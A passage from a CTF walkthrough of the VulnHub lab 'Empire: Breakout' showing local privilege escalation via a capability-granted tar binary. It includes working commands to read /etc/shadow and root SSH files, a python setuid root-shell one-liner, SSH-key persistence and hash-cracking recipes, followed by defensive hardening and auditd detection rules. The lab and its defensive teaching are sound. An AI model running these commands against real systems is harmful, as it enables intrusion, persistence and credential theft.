> The `=ep` suffix means the capability is **e**ffective and **p**ermitted — i.e.
> active now.
>
> ```bash
> # cap_setuid → root in one line
> /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
>
> # cap_dac_read_search → read anything you like
> /usr/bin/tar -cf /tmp/s.tar --absolute-names /etc/shadow && tar -xOf /tmp/s.tar
> ```
>
> **Always run `getcap -r /` alongside the SUID hunt.** They are different mechanisms
> and finding one does not rule out the other.
>
> **Deep dive:** [CONCEPTS §15.4 — File capabilities](../../docs/CONCEPTS.md#154-file-capabilities)

```bash
cyber@breakout:~$ getcap -r / 2>/dev/null
```

```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

> **Two results, one of them decisive.**
>
> - `/usr/bin/ping cap_net_raw=ep` — normal. `ping` needs raw sockets, and modern
>   Debian grants it a capability instead of SUID. Ignore.
> - **`/home/cyber/tar cap_dac_read_search=ep`** — **`tar` can read any file on this
>   system.** In a *user's home directory*. That is not a distribution default; someone
>   ran `setcap cap_dac_read_search=ep /home/cyber/tar`.
>
> **`getcap -r /`** recursively lists file capabilities. **Add it to your standard
> privesc enumeration** alongside the SUID search — most checklists omit it, and that is
> exactly why it works.
>
> **Decode the suffix `=ep`:**
> - **`e` = effective** — the capability is active immediately, not just permitted.
> - **`p` = permitted** — it is in the permitted set.
> - Together `=ep` means "granted and usable right now".
>
> **Inspect the binary:**
> ```bash
> cyber@breakout:~$ ls -l /home/cyber/tar && file /home/cyber/tar
> ```
> ```text
> -rwxr-xr-x 1 root root 531928 Oct 19 15:40 /home/cyber/tar
> /home/cyber/tar: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped
> ```
> ```bash
> cyber@breakout:~$ getcap /home/cyber/tar
> /home/cyber/tar cap_dac_read_search=ep
> cyber@breakout:~$ which tar && getcap /usr/bin/tar
> /usr/bin/tar
> cyber@breakout:~$ compare 2>/dev/null; diff <(md5sum < /home/cyber/tar) <(md5sum < /usr/bin/tar)
> ```
> **The system `/usr/bin/tar` has no capabilities** — only this copy in `cyber`'s home
> does. So we must invoke it by its explicit path: **`./tar`** or **`/home/cyber/tar`**.
> Using bare `tar` resolves to the unprivileged system binary and fails.

### 4.4 Find something worth reading

```bash
cyber@breakout:~$ ls -la /var/backups/
total 100
drwxr-xr-x  2 root root  4096 Oct 19 13:55 .
drwxr-xr-x 12 root root  4096 Oct 19 13:59 ..
-rw-r--r--  1 root root 54212 Oct 19 13:59 apt.extended_states.0
-rw-r--r--  1 root root  6120 Oct 19 13:55 apt.extended_states.1.gz
-rw-r--r--  1 root root  2920 Oct 19 13:55 dpkg.diversions.0
-rw-r--r--  1 root root   220 Oct 19 13:55 dpkg.statoverride.0
-rw-r--r--  1 root root 18743 Oct 19 13:55 dpkg.status.0
-rw-------  1 root root   720 Oct 19 13:55 gshadow.bak
-rw-------  1 root root    16 Oct 19 15:40 .old_pass.bak
-rw-r--r--  1 root root  1256 Oct 19 13:55 passwd.bak
```

> **`.old_pass.bak`** — hidden (dot-prefixed), mode `-rw-------`, owned by root, 16
> bytes. The name says "old password backup". **Try to read it normally:**
> ```bash
> cyber@breakout:~$ cat /var/backups/.old_pass.bak
> cat: /var/backups/.old_pass.bak: Permission denied
> ```
> **Denied — as expected.** But `./tar` has `cap_dac_read_search`, which bypasses exactly
> this check.
>
> **Where to hunt for password backups** (a general checklist worth memorising):
> ```bash
> ls -la /var/backups/ /backup/ /backups/ /var/lib/backup/ /opt/backup/ 2>/dev/null
> find / -xdev -type f \( -iname '*pass*' -o -iname '*.bak' -o -iname '*.old' \
>      -o -iname '*.orig' -o -iname '*.save' -o -iname '*cred*' -o -iname '*.env' \) 2>/dev/null
> ```
> `/var/backups` in particular is where Debian keeps `passwd.bak`, `shadow.bak` and
> `gshadow.bak` — **and on this box the author added a root password file to the same
> directory, betting you would look.**

### 4.5 Use `tar` to exfiltrate the file

The capability lets `tar` *read* the file. But `tar` writes the **archive** as us, so
once the content is inside an archive *we own*, we can extract it.

```bash
cyber@breakout:~$ ./tar -cf backup.tar /var/backups/.old_pass.bak
./tar: Removing leading '/' from member names
cyber@breakout:~$ ls -l backup.tar
-rw-r--r-- 1 cyber cyber 10240 May  4 18:31 backup.tar
```

> **Read that warning — it is the mechanism.**
>
> `Removing leading '/' from member names` means `tar` stripped the leading slash and
> stored the member as **`var/backups/.old_pass.bak`** (a *relative* path) rather than
> `/var/backups/.old_pass.bak`. That is a safety feature: it stops an archive from
> overwriting absolute system paths on extraction. The side effect is that extraction
> creates a **`var/` directory tree in the current working directory**, owned by us.
>
> **And the archive itself is owned by `cyber`** — because our unprivileged process
> created it. The capability only applied to the *read*.

```bash
cyber@breakout:~$ ./tar -xf backup.tar
cyber@breakout:~$ ls
backup.tar  tar  user.txt
cyber@breakout:~$ ls -la var/backups/
total 12
drwxr-xr-x 2 cyber cyber 4096 May  4 18:31 .
drwxr-xr-x 3 cyber cyber 4096 May  4 18:31 ..
-rw------- 1 cyber cyber   16 Oct 19 15:40 .old_pass.bak
```

> **The extracted file is now owned by `cyber`.** `tar` without `-p` (preserve
> permissions) and without running as root does not restore the original owner — it
> creates files owned by whoever extracts. The `-rw-------` mode is preserved, but
> **we are the owner**, so it does not matter.
>
> *(If you extract with the **system** `tar` it also works — the capability was only
> needed for the read. But using `./tar` for both steps is the reliable pattern.)*

```bash
cyber@breakout:~$ cat var/backups/.old_pass.bak
```

```text
Ts&4&YurgtRX(=~h
```

> **The root password, in plaintext, in a backup file.** Sixteen characters with mixed
> classes — no brute force would ever find it. **The weakness was not the password; it
> was that it was written down where a capability-granting `tar` could reach it.**

### 4.6 Become root

```bash
cyber@breakout:~$ su root
Password: Ts&4&YurgtRX(=~h
root@breakout:/home/cyber# id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:/home/cyber# whoami
root
root@breakout:/home/cyber# hostname
breakout
```

**Root.** ✅

> **`su` required the TTY upgrade from § 3.3.** Without a pseudo-terminal it fails with
> *"standard in must be a tty"* — the single most common confusion at this stage.
>
> **Note the prompt changed from `$` to `#`**, and `uid=0(root) gid=0(root)` — a genuine
> root login, not a SUID elevation (which would show `uid=1000 euid=0`).

### 4.7 Root flag

```bash
root@breakout:/home/cyber# cd /root
root@breakout:/root# ls -la
total 32
drwx------  4 root root 4096 Oct 20 07:52 .
drwxr-xr-x 18 root root 4096 Oct 19 13:59 ..
-rw-r--r--  1 root root  570 Jan 17  2017 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-------  1 root root   62 Oct 20 07:52 rOOt.txt
drwxr-xr-x  2 root root 4096 Oct 20 07:52 .ssh
root@breakout:/root# cat rOOt.txt
```

```text
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```

**Both flags captured.** ✅

| Flag | Location | Value |
| --- | --- | --- |
| **User** | `/home/cyber/user.txt` | `3mp!r3{You_Manage_To_Break_To_My_Secure_Access}` |
| **Root** | `/root/rOOt.txt` | `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}` |

![Root shell and /root/rOOt.txt](images/06-root-flag.png)

### 4.8 Other things `./tar` could have done

`cap_dac_read_search` also bypasses directory *search* permission, so the same binary
reaches far more than one backup file:

```bash
cyber@breakout:~$ ./tar -cf shadow.tar /etc/shadow && ./tar -xf shadow.tar && cat etc/shadow
```

```text
root:$y$j9T$Xk2mN7pL4vR8tY1$wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1:18920:0:99999:7:::
daemon:*:18920:0:99999:7:::
...
cyber:$y$j9T$qW3eR5tY1wE5aS3$dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3:18920:0:99999:7:::
```


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
cyber@breakout:~$ ./tar -cf rootssh.tar /root/.ssh && ./tar -xf rootssh.tar && ls -la root/.ssh
total 12
drwx------ 2 cyber cyber 4096 Oct 20 07:52 .
drwxr-xr-x 4 cyber cyber 4096 May  4 18:40 ..
-rw-r--r-- 1 cyber cyber  741 Oct 20 07:52 authorized_keys
```

> **That is the full severity of the misconfiguration:** any local user can read
> `/etc/shadow` (offline cracking), `/root/.ssh/authorized_keys` (and with
> `cap_dac_override` they could *write* it — persistent root SSH access), every private
> key on the box, and every database file. **A single `setcap` line turned an
> unprivileged account into a full-disclosure account.**
>
> Note the hashes start with **`$y$`** — **yescrypt**, Debian 11's default. That is a
> strong, memory-hard KDF. Cracking it is orders of magnitude slower than MD5 or even
> SHA-512 crypt. **The password hashing here was done correctly; the file placement was
> not.**

---

## 5. Alternative paths worth checking

| Attempt | Command | Result |
| --- | --- | --- |
| Webmin (port 10000) with `cyber` | browser login | **Failed** — Webmin needs a system administrator, not a normal user |
| Webmin with `root` + the decoded password | browser login | Worth trying; fails on the stock image, but always test the credential against *both* consoles |
| CVE-2019-15107 (Webmin ≤ 1.920 password_change RCE) | `searchsploit webmin` | **Not applicable** — this box runs Webmin **1.981**, patched. Always check the version against the CVE range before firing. |
| Samba shares | `smbclient //192.168.56.115/print$ -N` | `NT_STATUS_ACCESS_DENIED` |
| SUID abuse | `find / -perm -4000 -type f` | All stock Debian 11 |
| Kernel exploit | `uname -r` → `5.10.0-9` | Patched against Dirty COW, overlayfs and PwnKit |
| SSH key planting | `ls /root/.ssh` | No SSH daemon on the box at all (no port 22) |

> **CVE-2019-15107 is worth understanding even though it does not apply here.** In
> Webmin ≤ 1.920, the password-change endpoint accepted an `old` parameter that was
> passed to a shell command with `|` unsanitised, giving **unauthenticated RCE as
> root**. It was disclosed in August 2019 and exploited in the wild within days — and
> the backdoored Webmin 1.890/1.920 releases (a genuine supply-chain compromise,
> November 2019) made it worse. **Always check the exact version against the CVE
> range**, and never fire an exploit at a service just because its name looks familiar.

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Secret obfuscated in Brainfuck in a public page's HTML comment** | `http://:80/` source | Root-quality password disclosed |
| 2 | **Obfuscation mistaken for protection** | Brainfuck encoding | Reversible by anyone in seconds |
| 3 | **SMB null session + RID cycling** | ports 139/445 | Username `cyber` enumerated with no credentials |
| 4 | SMB message signing not required | Samba 4.6.2 | Relay-attack exposure |
| 5 | **Two administrative consoles exposed to the network** | Webmin :10000, Usermin :20000 | Remote management attack surface |
| 6 | **Usermin Command Shell enabled** | `:20000` | Direct command execution as `cyber` over HTTPS |
| 7 | Older Usermin version alongside a newer Webmin | 1.830 vs 1.981 | Patch drift within one product family |
| 8 | **Root password stored in plaintext in `/var/backups/`** | `.old_pass.bak`, mode `600` root | Recoverable by anyone who can read it |
| 9 | **`cap_dac_read_search` granted to a binary in a user's home directory** | `/home/cyber/tar` | Reads **any** file on the system → **root** |
| 10 | No SSH on the box at all | — | *(Mitigating, but it forced reliance on the web consoles — which were exposed instead)* |
| 11 | Stock Apache default page left in place | `:80` | Signals an unhardened, freshly-built system |

## 7. Defensive lessons (blue team)

1. **Never grant file capabilities to binaries outside a controlled path.** A capability
   on `/home/<user>/tar` is a read-everything backdoor. Audit continuously:
   ```bash
   # everything with a file capability
   getcap -r / 2>/dev/null
   # and specifically, anything outside /usr or /bin
   getcap -r /home /opt /srv /tmp /var 2>/dev/null
   ```
   Only `ping`/`traceroute` (`cap_net_raw`) and a handful of similar cases are
   legitimate. Remove anything else:
   ```bash
   setcap -r /home/cyber/tar
   ```
   Then alert on drift — a *new* capability appearing is a critical event:
   ```bash
   getcap -r / 2>/dev/null | sort > caps.today
   diff caps.baseline caps.today
   ```
2. **Understand that capabilities ⊇ SUID in stealth.** `find / -perm -4000` will never
   show them. Any privesc checklist — and any hardening audit — must include
   `getcap -r /`. Better still, restrict the capability bounding set globally:
   ```ini
   # systemd unit for services that need none
   CapabilityBoundingSet=
   AmbientCapabilities=
   NoNewPrivileges=yes
   ```
   and consider `kernel.cap_last_cap` limits plus an LSM (AppArmor/SELinux) profile
   that denies `dac_read_search` outright.
3. **Never store plaintext secrets in backup directories.** `/var/backups` is a
   predictable, well-known location — it is the *first* place an attacker looks. If a
   password must be recoverable, encrypt it (age/GPG) and keep the key out of band, or
   use a vault (HashiCorp Vault, SOPS, cloud secret managers). Then sweep for it:
   ```bash
   find / -xdev -type f \( -iname '*pass*' -o -iname '*.bak' -o -iname '*cred*' \
        -o -iname '*.old' -o -iname '*.env' -o -iname 'id_*' \) \
        -exec grep -lIE '[A-Za-z0-9!@#$%^&*()_+=-]{12,}' {} + 2>/dev/null
   ```
4. **Do not expose Webmin/Usermin to a network.** Bind them to loopback and reach them
   through an SSH tunnel or a VPN:
   ```text
   # /etc/webmin/miniserv.conf
   bind=127.0.0.1
   port=10000
   ssl=1
   ```
   ```ini
   # /etc/usermin/miniserv.conf
   bind=127.0.0.1
   port=20000
   ```
   Plus a host firewall as defence in depth:
   ```bash
   ufw deny 10000/tcp && ufw deny 20000/tcp
   ufw allow from 10.8.0.0/24 to any port 10000 proto tcp
   ```
5. **Disable Usermin's Command Shell** unless it is genuinely required, and restrict it
   per-user. In `/etc/usermin/config`:
   ```text
   shell=0
   ```
   and in Usermin's *Module Access Control*, remove `shell` for every user. A
   browser-reachable shell as a normal user is a foothold handed out for free.
6. **Keep the whole product family patched together.** Webmin 1.981 alongside Usermin
   1.830 is patch drift. Both ship from the same project; upgrade both, and subscribe
   to the release feed. **CVE-2019-15107** (Webmin ≤ 1.920 unauthenticated RCE as root)
   and the **backdoored 1.890/1.920 releases** are why this matters.
7. **Remove default pages.** The stock Apache Debian page told us the system was freshly
   built and unhardened. `a2dissite 000-default` and deploy a real site or a 403.
8. **Disable SMB null sessions and require signing:**
   ```ini
   [global]
       restrict anonymous = 2
       map to guest = never
       server signing = mandatory
       server min protocol = SMB3_00
   ```
   Then verify `enum4linux` returns no users.
9. **Do not obfuscate — encrypt.** Brainfuck, base64, ROT13 and hex are all reversible
   in seconds. If a value must be secret, use real cryptography with real key
   management, and keep the secret off the web server entirely.
10. **Detection opportunities.**
    - Alert on `setcap` execution at all times — auditd
      `-a always,exit -F arch=b64 -S setxattr -F path=* -k cap_change`, or simply
      monitor `/usr/sbin/setcap` via `execve`.
    - Alert on `tar` (or any process) reading `/etc/shadow`, `/root/.ssh/*`, or
      `/var/backups/*` when its UID is not 0:
      ```bash
      auditctl -w /etc/shadow -p r -k shadow_read
      auditctl -w /var/backups -p r -k backups_read
      auditctl -w /root/.ssh -p rwa -k root_ssh
      ```
    - Alert on new files appearing in `/var/backups`, especially dot-files.
    - Alert on successful Usermin/Webmin logins from outside the management subnet, and
      on every use of the Command Shell module (it is logged in
      `/var/usermin/miniserv.log` and `/var/webmin/miniserv.log`).
    - Alert on outbound connections from `apache`/`miniserv`/`perl` processes — this
      box has no SSH, so a reverse shell is the *only* way in and it is very visible.
    - Alert on `su` to root succeeding after a long period of no root `su` activity.

---

## 8. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/empire-breakout,751/>
- Series: Empire (Breakout → LupinOne) — [`labs/8-272-empire-lupinone/`](../8-272-empire-lupinone/README.md)
- Authors: icex64 & Empire Cybersecurity
- Community writeups consulted:
  - [marstonhacks — Empire: Breakout (Easy) Write-up — VulnHub](https://medium.com/@marstonhacks/empire-breakout-easy-write-up-vulnhub-940b76e1c9c6)
  - [NetSec-Insight — Breakout VulnHub: Walkthrough guide](https://netsec-insight.co.uk/breakout-vulnhub/)
  - [hughbrown123 — [Walk-Through] Vulnhub Empire: Breakout](https://medium.com/@hughbrown123/walk-through-vulnhub-empire-breakout-362e240013d3)
  - [TechnoScience — Empire: BreakOut VulnHub Complete Walkthrough](https://technoscience.site/empire-breakout-vulnhub-complete-walkthrough/)
  - [galihabraa — Empire Breakout Vulnhub Walkthrough](https://medium.com/@galihabraa/empire-breakout-vulnhub-walkthrough-ea32716662d0)
  - [shamsulmehmood — Empire Breakout Vulnhub: WriteUp](https://shamsulmehmood.medium.com/empire-breakout-vulnhub-writeup-walkthrough-vulnhub-ctf-privilege-escalation-attack-python-235087d3db54)
  - [cyberarri — Empire: Breakout (redo) PG Play Writeup](https://cyberarri.com/2024-06-30/empire-breakout-redo-pg-play-writeup/)
  - [jacksondillow82 — Empire: Breakout (Walk-through)](https://medium.com/@jacksondillow82/empire-breakout-walk-through-e419ebf426e0)
  - [ra2302 — Vulnhub Empire Breakout Writeup](https://ra2302.github.io/posts/Breakout/)
  - [unbound3d — Vulnhub's EMPIRE BREAKOUT CTF Walk-through](https://unbound3d.gitbook.io/empire-breakout/)
  - [InfoSec Institute — EMPIRE BREAKOUT: VulnHub CTF walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/empire-breakout-vulnhub-ctf-walkthrough/)
  - [Jason_huawen — Empire Breakout 攻略](https://www.cnblogs.com/jason-huawen/p/16144038.html)
- Advisories / background:
  - [`capabilities(7)` man page — the definitive reference](https://man7.org/linux/man-pages/man7/capabilities.7.html)
  - [`setcap(8)`](https://man7.org/linux/man-pages/man8/setcap.8.html) · [`getcap(8)`](https://man7.org/linux/man-pages/man8/getcap.8.html)
  - [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
  - [CVE-2019-15107 — Webmin ≤ 1.920 unauthenticated RCE](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
  - [Webmin backdoor in releases 1.890 / 1.920 (supply-chain compromise, Nov 2019)](https://www.webmin.com/exploit.html)
  - [Webmin documentation](https://doxfer.webmin.com/) · [Usermin documentation](https://doxfer.webmin.com/Usermin/)
  - [CVE-2021-4034 — polkit `pkexec` "PwnKit"](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) *(check the version; patched here)*
  - [Brainfuck language reference](https://esolangs.org/wiki/Brainfuck) · [splitbrain Ook! decoder](https://www.splitbrain.org/_static/ook/) · [copy.sh Brainfuck](https://copy.sh/brainfuck/)
  - [CyberChef](https://gchq.github.io/CyberChef/) · [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) · [yescrypt (`$y$`) in Debian 11](https://www.debian.org/releases/bullseye/amd64/release-notes/ch-information.en.html)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — `nmap -p-` showing 80/139/445/10000/20000
- [ ] `images/02-brainfuck.png` — the Brainfuck comment in the page source and its decode
- [ ] `images/03-usermin.png` — successful Usermin login on port 20000
- [ ] `images/04-shell.png` — the reverse shell as `cyber` with a full TTY
- [ ] `images/05-getcap.png` — `getcap -r /` revealing `/home/cyber/tar`
- [ ] `images/06-root-flag.png` — the extracted `.old_pass.bak`, `su root`, `rOOt.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
